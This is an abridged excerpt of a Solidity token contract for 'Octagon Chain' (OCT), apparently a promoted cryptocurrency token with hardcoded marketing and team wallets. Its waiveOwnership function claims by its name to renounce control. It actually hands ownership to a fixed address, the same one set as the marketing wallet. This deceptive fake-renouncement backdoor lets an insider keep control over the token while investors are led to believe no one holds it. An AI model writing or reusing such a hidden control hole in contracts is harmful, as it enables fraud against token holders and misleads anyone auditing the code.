...
//Telegram https://t.me/octagonchain
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x42037887FE72Ca18b7304d71d143D3986a6ef5bC);
    }
...
contract OCTAGONCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Octagon Chain";
    string private _symbol = "OCT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x42037887FE72Ca18b7304d71d143D3986a6ef5bC);
    address payable public teamWalletAddress = payable(0x1dE167606bd5a497De935DFC0d74BEE0C71Aa970);
